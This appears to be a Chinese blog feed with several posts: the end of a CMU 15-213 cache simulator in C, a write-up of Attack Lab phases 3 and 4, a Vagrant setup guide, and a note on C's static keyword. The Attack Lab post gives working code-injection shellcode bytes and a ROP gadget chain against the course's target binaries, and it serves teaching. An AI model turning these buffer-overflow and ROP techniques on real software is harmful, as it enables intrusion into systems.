class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;queue.h&quot;</span><br><span class="line"></span><br><span class="line">/* 将十六进制字符串转换为十进制整数 */</span><br><span class="line">int hexstr2int(char * HexStr)</span><br><span class="line">&#123;</span><br><span class="line">int iResult = 0, iCycle = 1;</span><br><span class="line"></span><br><span class="line">    //判断字符串是否合法</span><br><span class="line">if( !strlen( HexStr ) )</span><br><span class="line">&#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    //指针变量p指向字符串的末尾</span><br><span class="line">char * p = HexStr + strlen( HexStr );</span><br><span class="line"></span><br><span class="line">while( (--p+1) != HexStr )</span><br><span class="line">&#123;</span><br><span class="line">if ( *p &gt;= &apos;0&apos; &amp;&amp; *p &lt;= &apos;9&apos; )</span><br><span class="line">iResult += ( *p - &apos;0&apos; )*iCycle;</span><br><span class="line">else if ( *p &gt;= &apos;A&apos; &amp;&amp; *p &lt;= &apos;F&apos; )</span><br><span class="line">iResult += ( *p - &apos;A&apos; + 10 )*iCycle;</span><br><span class="line">else if ( *p &gt;= &apos;a&apos; &amp;&amp; *p &lt;= &apos;f&apos; )</span><br><span class="line">iResult += ( *p - &apos;a&apos; + 10 )*iCycle;</span><br><span class="line">iCycle &lt;&lt;= 4;</span><br><span class="line">&#125;</span><br><span class="line">return iResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">int opt;</span><br><span class="line">int s, E, b; /* cache parameter */</span><br><span class="line">int S, B;</span><br><span class="line">int miss=0, hit=0, eviction=0; /* count on miss/hit/eviction */</span><br><span class="line">int i, j, flag=0; /* dummy variable */</span><br><span class="line">char *filename;</span><br><span class="line">queue *q, *qi; </span><br><span class="line"></span><br><span class="line">cacheline **cache; // every cache has S set, every set has E lines</span><br><span class="line">cacheline cacheij, *cacheij_address; //dummy variable</span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line">char operator, *address, size;</span><br><span class="line">unsigned d_address, tag, set, bit; // 地址，标记(t)，组索引(s)，块偏移(b) </span><br><span class="line"></span><br><span class="line">while((opt=getopt(argc, argv, &quot;s:E:b:t:v::&quot;)) != -1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;-%c %s &quot;, opt, optarg);</span><br><span class="line">switch (opt)</span><br><span class="line">&#123;</span><br><span class="line">case &apos;s&apos;:</span><br><span class="line">s = atoi(optarg);</span><br><span class="line">break;</span><br><span class="line">case &apos;E&apos;:</span><br><span class="line">E = atoi(optarg);</span><br><span class="line">break;</span><br><span class="line">case &apos;b&apos;:</span><br><span class="line">b = atoi(optarg);</span><br><span class="line">break;</span><br><span class="line">case &apos;t&apos;:</span><br><span class="line">filename = optarg;</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">printf(&quot;Wrong argumet \n&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">S = 2 &lt;&lt; s;</span><br><span class="line">B = 2 &lt;&lt; b;</span><br><span class="line"></span><br><span class="line">/* allocate memory */</span><br><span class="line">cache = (cacheline **) malloc(sizeof(cacheline*) *S);</span><br><span class="line">address = (char *) malloc(sizeof(char) * 16);</span><br><span class="line">q = (queue *) malloc(sizeof(queue) * S);</span><br><span class="line">for (qi=q, i=0; i&lt;S; qi++, i++)</span><br><span class="line">&#123;</span><br><span class="line">cache[i] = (cacheline *) malloc(sizeof(cacheline) *E); /* 每一个缓存组都有E个缓存行 */</span><br><span class="line">qi-&gt;full_size = E;</span><br><span class="line">for (j=0; j&lt; E; j++)</span><br><span class="line">&#123;</span><br><span class="line">/* 设定缓存行 */</span><br><span class="line">cacheij = cache[i][j];</span><br><span class="line">cacheij.valid_bit = 0;</span><br><span class="line">cacheij.tag = i*E+j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    /* open file */</span><br><span class="line">fp = fopen(filename, &quot;r&quot;);</span><br><span class="line">if(fp == NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Open filefailure!&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">/* read trace data */</span><br><span class="line">while(fscanf(fp, &quot; %c %[^,],%c&quot;, &amp;operator, address, &amp;size)==3)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c %s,%c &quot;, operator, address, size);</span><br><span class="line"></span><br><span class="line">/* process address */</span><br><span class="line">d_address = hexstr2int(address);</span><br><span class="line">tag = d_address &gt;&gt; (b+s); /* 标记t */</span><br><span class="line">set = (d_address &amp; ((1&lt;&lt;(b+s))-1)) &gt;&gt; b; /* 组索引s */</span><br><span class="line">bit = (d_address) &amp; ((1&lt;&lt;b)-1); /* 块偏移b, 其实模拟时没用，但还是写上 */</span><br><span class="line">printf(&quot;     address: %x, tag:%d, set:%d, bit:%d     &quot;, d_address, tag, set, bit);</span><br><span class="line"></span><br><span class="line">/* 找到缓存行，根据操作符（I，L，S，M)，进行操作 */</span><br><span class="line">if (operator == &apos;L&apos; || operator == &apos;S&apos; || operator == &apos;M&apos;)</span><br><span class="line">&#123;</span><br><span class="line">/* 首先根据标记，找到行 */</span><br><span class="line">flag = 0; /* if flag=0, we didn&apos;t find it */</span><br><span class="line">for (i=0; i&lt;E; i++)</span><br><span class="line">&#123;</span><br><span class="line">cacheij_address = &amp;cache[set][i];</span><br><span class="line">if ((cacheij_address-&gt;tag == tag) &amp; (cacheij_address-&gt;valid_bit))</span><br><span class="line">/* OK, find it */</span><br><span class="line">&#123;</span><br><span class="line">flag = 1;</span><br><span class="line">hit += 1;</span><br><span class="line">printf(&quot;hit &quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!flag)</span><br><span class="line">&#123;</span><br><span class="line">/* we can&apos;t find it! */</span><br><span class="line">printf(&quot;miss &quot;);</span><br><span class="line">miss += 1;</span><br><span class="line">/* set is full or not */</span><br><span class="line">if (is_full(&amp;q[set]))</span><br><span class="line">&#123;</span><br><span class="line">/* it&apos;s full, pop a cache_line, fill in and push it */</span><br><span class="line">cacheij_address= pop(&amp;q[set]);</span><br><span class="line">cacheij_address-&gt;tag = tag;</span><br><span class="line">push(&amp;q[set], cacheij_address);</span><br><span class="line">eviction += 1;</span><br><span class="line">printf(&quot;eviction &quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">/* find the uncached cache_line, and fill in */</span><br><span class="line">for (i=0; i&lt;E; i++)</span><br><span class="line">&#123;</span><br><span class="line">cacheij_address = &amp;cache[set][i];</span><br><span class="line">if (!cacheij_address-&gt;valid_bit)</span><br><span class="line">&#123;</span><br><span class="line">cacheij_address-&gt;tag = tag;</span><br><span class="line">cacheij_address-&gt;valid_bit = 1;</span><br><span class="line">push(&amp;q[set], cacheij_address);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">/* if &quot;M&quot; */</span><br><span class="line">if (operator == &apos;M&apos;)</span><br><span class="line">&#123;</span><br><span class="line">hit += 1;</span><br><span class="line">printf(&quot;hit &quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;hits:%d misses:%d evictions:%d&quot;, hit, miss, eviction);</span><br><span class="line">//free the memory of cache</span><br><span class="line">for (i=0; i&lt;S; i++)</span><br><span class="line">free(cache[i]);</span><br><span class="line">free(address);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line">//printSummary(0, 0, 0);</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CMU 15-213 Lab4 Cache Lab&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://csapp.cs.cmu.edu/3e/labs.html&quot;&gt;Lab 下载地址&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://scs.hosted.p
      
    
    </summary>
    
      <category term="CSAPP Lab" scheme="http://larryim.cc/categories/CSAPP-Lab/"/>
    
    
      <category term="CSAPP" scheme="http://larryim.cc/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>Lab3 Attack Lab</title>
    <link href="http://larryim.cc/2017/12/30/CSAPP-Lab-Attack-Lab/"/>
    <id>http://larryim.cc/2017/12/30/CSAPP-Lab-Attack-Lab/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-01-18T06:59:26.602Z</updated>
    
    <content type="html"><![CDATA[<p>CMU 15-213 Lab3 Attack Lab</p><ul><li><a href="http://csapp.cs.cmu.edu/3e/labs.html">Lab 下载地址</a></li><li><a href="https://scs.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=60c65748-2026-463f-8c57-134fd6661cdf">Recitation讲解</a></li></ul><h2 id="Phase3"><a href="#Phase3" class="headerlink" title="Phase3"></a>Phase3</h2><p>Phase3的任务是调用<code>touch3</code>函数，并传入cookie字符串。所涉及的函数的代码是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>touch3</code>函数会调用函数<code>hexmatch</code>进行，对比传入的<code>sval</code>字符串(也就是我们要传入的cookie)是否和程序内部的cookie一致。所以我们应该大致清楚attack的步骤：</p><ul><li>传入参数<code>sval</code>到<code>touch3</code>, 由于<code>sval</code>是字符串指针，所以我们要在%rdi(Arg1 寄存器)中放入字符串的地址。</li><li>把字符串放在栈中，但是要防止函数调用时将其覆盖。</li><li>设置<code>touch3</code>函数的地址为返回值地址。</li></ul><p>这题稍微有些复杂，我们一步一步来，先把cookie(0x59b997fa) 转换成字符串的表达形式，也就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa-&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>在Linux下，可用<code>man ascii</code>查找字符所对应的ascii码。</p><p>然后构造注入代码，<code>touch3</code>的地址为0x4018fa, 根据phase2我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28, 字符串存放的地址应为%rsp+0x30.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#phase3.s</span><br><span class="line">movq $0x5561dc98,%rdi                                                                                                   </span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c phase3.s</span><br><span class="line">$ objdump -d phase3.o &gt; phase3.d</span><br></pre></td></tr></table></figure><p>得到字节码<code>48 c7 c7 98 dc 61 55 68 fa 18 40 00 c3</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 c7 c7 98 dc 61 55 mov    $0x5561dc98,%rdi</span><br><span class="line">   7:68 fa 18 40 00       pushq  $0x4018fa</span><br><span class="line">   c:c3                   retq</span><br></pre></td></tr></table></figure><p>生成最终的字节码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat phase3.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><p>从Phase4开始，攻击手段变为ROP(Return-Oriented Programming), 并且使用了<strong>栈随机化</strong>和<strong>限制可执行代码区域</strong>。ROP使用现存的代码进行攻击，而不是注入攻击代码。使用ROP的诀窍是找到现存程序中存在ret指令的代码。这些代码一般被叫做gadget.</p><p>Phase4的任务与Phase2相同，传递cookie(0x59b997fa)到touch2(0x4017ec), 但是攻击的程序变成rtarget. rtarge内的gadget限定在start_farm和mid_farm之间。</p><p>要把cookie作为一个参数，我们只能把cookie写入到(%rsp)，然后弹出。所以首先我们要查找pop指令，pop系列指令如下</p><p><img src="http://or9a8nskt.bkt.clouddn.com/pop.png" alt="pop"></p><p>所以我们要查找<code>5x c3</code>这样的指令，x可以指代<code>8,9,a,b,c,d,e,f</code>。然后再查找mov指令。构成<code>pop %x; mov %x %rdi; ret</code>这样的指令，完成cookie传送。其中mov指令如下：</p><p><img src="http://or9a8nskt.bkt.clouddn.com/mov.png" alt="mov"></p><p>还有有两个比较重要的指令</p><ul><li>ret: 返回 0xc3</li><li>nop: 什么都不做，只是让程序计数器加一 0x90</li></ul><p>由于0x90没有任何意义，所以它可以出现在任何地方。</p><p>顺着代码查找，很快就可以找到一个gadget: <code>58 90 c3 pop %rax; ret;</code>，地址在0x4019cc.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3</span><br></pre></td></tr></table></figure><p>接着查找<code>mov %rax %rdi</code>对应的字节码<code>48 89 c7</code>。直接搜索<code>48 89 c7 c3</code>, 地址在0x4019a2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq</span><br></pre></td></tr></table></figure><p>最终形成的字符输入为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00 # pop %rax; ret</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie</span><br><span class="line">a2 19 40 00 00 00 00 00 # mov %rax %rdi; ret;</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2的返回地址</span><br></pre></td></tr></table></figure><p>执行结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat phase4.txt| ./hex2raw| ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CMU 15-213 Lab3 Attack Lab&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://csapp.cs.cmu.edu/3e/labs.html&quot;&gt;Lab 下载地址&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://scs.hosted.
      
    
    </summary>
    
      <category term="CSAPP Lab" scheme="http://larryim.cc/categories/CSAPP-Lab/"/>
    
    
      <category term="CSAPP" scheme="http://larryim.cc/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>vagrant搭建ubuntu</title>
    <link href="http://larryim.cc/2017/12/30/awesome-Install-vagrant%E6%90%AD%E5%BB%BAubuntu/"/>
    <id>http://larryim.cc/2017/12/30/awesome-Install-vagrant搭建ubuntu/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-03-14T05:26:57.477Z</updated>
    
    <content type="html"><![CDATA[<p><code>Vagrant</code> 是一款用来管理虚拟机的工具，可以构建虚拟开发环境的。<code>Vagrant</code>封装一个<code>Linux</code>(Ubuntu/CentOS等)的开发环境，分享给其他开发人员。而其他人可以在自己喜欢的桌面系统（Mac/Windows/Linux）上开发程序，代码却能统一在封装好的环境里运行，可以把开发环境配制成与生产环境一样。</p><h1 id="Mac-terminal下的Vagrant和-Ubuntu环境的安装"><a href="#Mac-terminal下的Vagrant和-Ubuntu环境的安装" class="headerlink" title="Mac terminal下的Vagrant和 Ubuntu环境的安装"></a>Mac terminal下的<code>Vagrant</code>和 <code>Ubuntu</code>环境的安装</h1><p><code>Vagrant</code>可以从下面网页链接下载, 选择 ：<br><a href="https://www.vagrantup.com/downloads.html">https://www.vagrantup.com/downloads.html</a></p><p>安装好了Vagrant，后然后安装Virtualbox，请到<a href="https://www.virtualbox.org">下载网页</a>直接下载需要的版本。</p><p>下面安装<code>Ubuntu</code><br>（1）打开Mac terminal，运行下面命令，安装<code>Ubuntu</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vagrant init ubuntu/trusty64</span><br><span class="line">$ vagrant up</span><br></pre></td></tr></table></figure><p>其他的系统版本选择见<a href="https://app.vagrantup.com/boxes/search">https://app.vagrantup.com/boxes/search</a>, 最常用的是<code>ubuntu/trusty64</code>和<code>ubuntu/xenial64</code>.</p><p>键入<code>vagrant up</code>后，<code>vagrant</code>会下载您指定的操作系统，然后进行安装。整个下载安装过程一般在5分钟左右。</p><p>(2)连接到安装好的<code>Ubuntu</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 这个命令会通过ssh的方式连接虚拟机。</span><br><span class="line">$ vagrant ssh</span><br></pre></td></tr></table></figure><h2 id="分享文件"><a href="#分享文件" class="headerlink" title="分享文件"></a>分享文件</h2><p>打开位于配置文件<code>Vagrantfile</code>，配置其中的<code>config.vm.synced_folder</code>参数,第一个参数是需要位于主机需要同步的文件夹，可以是相对地址。第二个参数是虚拟机上的需要同步的文件夹，必须是绝对地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vagrant.configure(&quot;2&quot;) do |config|</span><br><span class="line">  # other config here</span><br><span class="line"></span><br><span class="line">  config.vm.synced_folder &quot;src/&quot;, &quot;/home/shared&quot;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>NOTE: By default, Vagrant will share your project directory (the directory with the Vagrantfile) to /vagrant.</p><h2 id="安装和配置ubuntu"><a href="#安装和配置ubuntu" class="headerlink" title="安装和配置ubuntu"></a>安装和配置<code>ubuntu</code></h2><p>这其实和正常的<code>ubuntu</code>系统一样的。一般通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software</span><br></pre></td></tr></table></figure><p>安装软件。</p><h3 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git</span><br><span class="line">sudo apt-get install gdb</span><br><span class="line">sudo apt-get install zsh</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span>  // install on-my-zsh</span><br></pre></td></tr></table></figure><p><strong><code>vagrant</code>虚拟机默认密码是<code>vagrant</code></strong></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vagrant box add &#123;作者/系统名&#125; &#123;box文件路径&#125;  #添加虚拟机</span><br><span class="line">vagrant box remove &#123;作者/系统名&#125;  #删除虚拟机</span><br><span class="line">vagrant init &#123;作者/系统名&#125;  #初化化虚拟机此时会生成一个Vagrantfile文件</span><br><span class="line">vagrant box list #查年现有的虚拟机</span><br><span class="line">vagrant status  #查看所有虚拟机状态</span><br><span class="line">vagrant halt &#123;作者/系统名&#125;  #关闭指定虚拟机</span><br><span class="line">vagrant provision  #当修改完配制后只要执行一下此命令就可以对虚拟机进行相关修改</span><br><span class="line">vagrant reload #重启虚拟机</span><br><span class="line">vagrant ssh  #使用ssh的方式连接虚拟机</span><br><span class="line">vagrant up  #启动虚拟机</span><br><span class="line">vagrant version #查看版本信息</span><br><span class="line">vagrant plugin &#123;插件&#125; #安装插件</span><br><span class="line">vagrant package &#123;作者/系统名&#125; #把你的虚拟机打包在box可以分享给你拉小人类伴们一起使用，非常方便</span><br><span class="line">vagrant resume  #恢复虚拟机</span><br><span class="line">vagrant suspend  #暂停虚拟机</span><br><span class="line">vagrant destroy  #销毁当前虚拟机</span><br></pre></td></tr></table></figure><h2 id="加载已经下载-存在的虚拟机"><a href="#加载已经下载-存在的虚拟机" class="headerlink" title="加载已经下载/存在的虚拟机"></a>加载已经下载/存在的虚拟机</h2><p>有时候虚拟机已经存在，或者你通过其他途径下载虚拟机更快，或者你从朋友那里拷贝了一个虚拟机，那么可不可以直接加载呢？</p><p>当然是可以的，而且一句话搞定，例如添加文件名为<code>path_to_file.box</code>的虚拟机以<code>my_box_name</code>的名字展现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vagrant box add my_box_name file:///path_to_file.box</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;Vagrant&lt;/code&gt; 是一款用来管理虚拟机的工具，可以构建虚拟开发环境的。&lt;code&gt;Vagrant&lt;/code&gt;封装一个&lt;code&gt;Linux&lt;/code&gt;(Ubuntu/CentOS等)的开发环境，分享给其他开发人员。而其他人可以在自己喜欢的桌面系统
      
    
    </summary>
    
      <category term="awesome Install" scheme="http://larryim.cc/categories/awesome-Install/"/>
    
    
      <category term="vagrant" scheme="http://larryim.cc/tags/vagrant/"/>
    
      <category term="ubuntu" scheme="http://larryim.cc/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>static用法</title>
    <link href="http://larryim.cc/2017/12/30/C-static%E7%94%A8%E6%B3%95/"/>
    <id>http://larryim.cc/2017/12/30/C-static用法/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-07-09T05:49:11.528Z</updated>
    
    <content type="html"><![CDATA[<p>static在C语言中是非常重要的关键字，但是它很容易被理解错误。因为static可以出现在多个地方，有着不同的含义：</p><ul><li>static 全局变量</li><li>static 局部变量</li><li>static 函数</li></ul><p>根本原因是[1]:<br><img src="http://or9a8nskt.bkt.clouddn.com/Screen Shot 2018-07-09 at 1.37.29 PM.png" alt="static"></p><p>当一个全局变量被声明为static(静态全局变量)时，它的存储位置并没有改变，还在虚拟内存的.data段（已初始化数据）。但是它只在定义它的源文件内有效，其他源文件无法访问它。它最重要的改变是<strong>链接属性</strong>的改变：静态变量的初始化在链接时已完成，如果显示指定初始值，则初始化为0。</p><p>每次函数调用静态局部变量的时候都修改它然后离开，下次读的时候从全局存储区读出的静态局部变量就是上次修改后的值。</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ol><li>Pointers on C, page 61</li></ol>]]></content>
    
    <summary type="html">
    
